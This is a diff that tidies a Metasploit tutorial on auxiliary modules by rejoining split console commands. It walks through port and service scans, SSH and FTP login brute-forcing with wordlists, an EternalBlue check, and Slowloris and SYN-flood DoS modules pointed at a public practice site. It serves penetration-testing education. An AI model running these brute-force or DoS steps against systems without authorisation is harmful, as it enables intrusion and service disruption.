@@ -29,13 +29,12 @@ The Ultimate Guide to Metasploit. Part 2
 
 ## Introduction
 
-The**auxiliary mode**in Metasploit is a non-exploit-focused category of modules designed for tasks such as reconnaissance, scanning, enumeration, password brute-forcing, and testing. These modules help gather information, identify vulnerabilities, and assess systems without actively exploiting them. They are essential in the early stages of penetration testing and for non-destructive assessments.
+The **auxiliary mode** in Metasploit is a non-exploit-focused category of modules designed for tasks such as reconnaissance, scanning, enumeration, password brute-forcing, and testing. These modules help gather information, identify vulnerabilities, and assess systems without actively exploiting them. They are essential in the early stages of penetration testing and for non-destructive assessments.
 
 **If you want to see all auxiliary modules, open Metasploit and run next command:**
 
 ```text
-show
- auxiliary
+show auxiliary
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*841wr-7t7wIMaSUJyalJ9Q.png" alt="Article image" width="1660" height="386" loading="lazy" decoding="async" />
@@ -45,50 +44,31 @@ show
 Search module:
 
 ```text
-search 
-<
-name
->
+search <name>
 ```
 
 Use module from list by ID
 
 ```text
-use
- 
-0
+use 0
 ```
 
 Use module by name
 
 ```text
-use <
-module
- name>
+use <module name>
 ```
 
 Show configuration options:
 
 ```text
-show
- options
+show options
 ```
 
 Set parameters:
 
 ```text
-set
- 
-<
-name 
-of
- 
-parameter
->
- 
-<
-parameter
->
+set <name of parameter> <parameter>
 ```
 
 Run module
@@ -126,17 +106,14 @@ search auxiliary/scanner/portscan/tcp
 <img src="https://cdn-images-1.medium.com/max/800/1*kGwGQb_vlY2UEu1PWf_6qg.png" alt="Article image" width="1513" height="253" loading="lazy" decoding="async" />
 
 ```text
-use
- 
-0
+use 0
 show options
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*cbo_IgrkTakTk7R7lMAJFQ.png" alt="Article image" width="1498" height="391" loading="lazy" decoding="async" />
 
 ```text
-set
- RHOST 192.168.126.130
+set RHOST 192.168.126.130
 run
 ```
 
@@ -151,22 +128,16 @@ search auxiliary/scanner/http/http_version
 <img src="https://cdn-images-1.medium.com/max/800/1*s58UjVjcPk73DQiBChir7A.png" alt="Article image" width="1475" height="256" loading="lazy" decoding="async" />
 
 ```text
-use
- 
-0
+use 0
 show options
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*VjqjJ1K2a90x0SogjSgyMw.png" alt="Article image" width="1457" height="301" loading="lazy" decoding="async" />
 
 ```text
-set
- RHOSTS https://juice-shop.herokuapp.com/
-set
- RPORT 443
-set
- SSL 
-true
+set RHOSTS https://juice-shop.herokuapp.com/
+set RPORT 443
+set SSL true
 run
 ```
 
@@ -187,17 +158,14 @@ search auxiliary/scanner/smb/smb_enumshares
 <img src="https://cdn-images-1.medium.com/max/800/1*QXfrBz_Xy2FWYXIx715PXA.png" alt="Article image" width="1428" height="256" loading="lazy" decoding="async" />
 
 ```text
-use
- 
-0
+use 0
 show options
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*ia5MA_9Hu9CgZoAZ4ZZRGA.png" alt="Article image" width="1613" height="804" loading="lazy" decoding="async" />
 
 ```text
-set
- RHOST 182.x.x.x
+set RHOST 182.x.x.x
 run
 ```
 
@@ -206,27 +174,16 @@ run
 - `auxiliary/scanner/http/dir_scanner`: Finds hidden web directories.
 
 ```text
-search
- auxiliary
-/
-scanner
-/
-http
-/
-dir_scanner
-use 
-0
-show
- options
+search auxiliary/scanner/http/dir_scanner
+use 0
+show options
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*3n4QNUHvEcnJTXZujtGe9g.png" alt="Article image" width="1918" height="678" loading="lazy" decoding="async" />
 
 ```text
-set
- RHOST https://juice-shop.herokuapp.com/
-set
- RPORT 443
+set RHOST https://juice-shop.herokuapp.com/
+set RPORT 443
 ```
 
 You can use custom directions dictionaries.
@@ -234,8 +191,7 @@ You can use custom directions dictionaries.
 For example:
 
 ```text
-set
- DICTIONARY /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+set DICTIONARY /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*3GZOOJs-nie63FQWq9CBWg.png" alt="Article image" width="1439" height="297" loading="lazy" decoding="async" />
@@ -257,24 +213,17 @@ search auxiliary/scanner/ssh/ssh_login
 <img src="https://cdn-images-1.medium.com/max/800/1*DCo92cNE5wA9_Ewo2d6-xQ.png" alt="Article image" width="1439" height="297" loading="lazy" decoding="async" />
 
 ```text
-use
- 
-0
+use 0
 show options
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*PsJqYaW4d3X97ZsdwJAWQQ.png" alt="Article image" width="1526" height="655" loading="lazy" decoding="async" />
 
 ```text
-set
- ANONYMOUS_LOGIN 
-true
-set
- PASS_FILE ~/Documents/PasswordCracking/Dictionaries/short.txt
-set
- RHOSTS 192.168.126.130
-set
- USER_FILE ~/Documents/PasswordCracking/Dictionaries/1000_usernames.txt
+set ANONYMOUS_LOGIN true
+set PASS_FILE ~/Documents/PasswordCracking/Dictionaries/short.txt
+set RHOSTS 192.168.126.130
+set USER_FILE ~/Documents/PasswordCracking/Dictionaries/1000_usernames.txt
 run
 ```
 
@@ -291,24 +240,17 @@ search auxiliary/scanner/ftp/ftp_login
 <img src="https://cdn-images-1.medium.com/max/800/1*z-9tmT5KYEEvhsAowMurdQ.png" alt="Article image" width="1801" height="270" loading="lazy" decoding="async" />
 
 ```text
-use
- 
-0
+use 0
 show options
 ```
 
 <img src="https://cdn-images-1.medium.com/max/800/1*Q9EnA2iwru1RZK_gr02iUQ.png" alt="Article image" width="1721" height="689" loading="lazy" decoding="async" />
 
 ```text
-set
- ANONYMOUS_LOGIN 
-true
-set
- PASS_FILE ~/Documents/PasswordCracking/Dictionaries/short.txt
-set
- RHOSTS 192.168.126.130
-set
- USER_FILE ~/Documents/PasswordCracking/Dictionaries/1000_usernames.txt
+set ANONYMOUS_LOGIN true
+set PASS_FILE ~/Documents/PasswordCracking/Dictionaries/short.txt
+set RHOSTS 192.168.126.130
+set USER_FILE ~/Documents/PasswordCracking/Dictionaries/1000_usernames.txt
 run
 ```
 
@@ -323,23 +265,10 @@ run
 `auxiliary/scanner/smb/smb_ms17_010`: Scans for EternalBlue vulnerability.
 
 ```text
-search
- auxiliary
-/
-scanner
-/
-smb
-/
-smb_ms17_010
-use 
-0
-show
- options
-set
- RHOSTS 
-192.168
-.126
-.150
+search auxiliary/scanner/smb/smb_ms17_010
+use 0
+show options
+set RHOSTS 192.168.126.150
 run
 ```
 
@@ -356,25 +285,11 @@ run
 **Run msfconsole as sudo**
 
 ```text
-search
- auxiliary
-/
-scanner
-/
-discovery
-/
-arp_sweep
-use 
-0
-show
- options
-set
- INTERFACE vmnet8
-set
- RHOSTS 
-192.168
-.126
-.13
+search auxiliary/scanner/discovery/arp_sweep
+use 0
+show options
+set INTERFACE vmnet8
+set RHOSTS 192.168.126.13
 run
 ```
 
@@ -383,24 +298,10 @@ run
 - `auxiliary/scanner/rdp/rdp_scanner`: Scans for RDP-enabled devices.
 
 ```text
-search
- auxiliary
-/
-scanner
-/
-rdp
-/
-rdp_scanner
-use 
-0
- 
-show
- options
-set
- RHOSTS 
-192.168
-.126
-.130
+search auxiliary/scanner/rdp/rdp_scanner
+use 0 
+show options
+set RHOSTS 192.168.126.130
 run
 ```
 
@@ -415,27 +316,12 @@ run
 `auxiliary/dos/http/slowloris`: Simulates Slowloris DoS on HTTP servers.
 
 ```text
-search
- auxiliary
-/
-dos
-/
-http
-/
-slowloris
-use 
-0
-show
- options
-set
- rhost juice
--
-shop.herokuapp.com
-set
- rport 
-443
-sel ssl 
-true
+search auxiliary/dos/http/slowloris
+use 0
+show options
+set rhost juice-shop.herokuapp.com
+set rport 443
+sel ssl true
 run
 ```
 
@@ -446,12 +332,9 @@ run
 ```text
 search auxiliary/dos/tcp/synflood
 use 0
-set
- INTERFACE wlan0
-set
- RHOSTS juice-shop.herokuapp.com
-set
- RPORT 443
+set INTERFACE wlan0
+set RHOSTS juice-shop.herokuapp.com
+set RPORT 443
 run
 ```
 
@@ -460,7 +343,7 @@ run
 ### Search and try other modules!
 
 [**Auxiliary Module Reference - Metasploit Unleashed**
-*The Metasploit Framework includes hundreds of auxiliary modules that perform scanning, fuzzing, sniffing, and much…*www.offsec.com](https://www.offsec.com/metasploit-unleashed/auxiliary-module-reference/)[](https://www.offsec.com/metasploit-unleashed/auxiliary-module-reference/)
+*The Metasploit Framework includes hundreds of auxiliary modules that perform scanning, fuzzing, sniffing, and much…*www.offsec.com](https://www.offsec.com/metasploit-unleashed/auxiliary-module-reference/)
 
 ## Good luck!
 
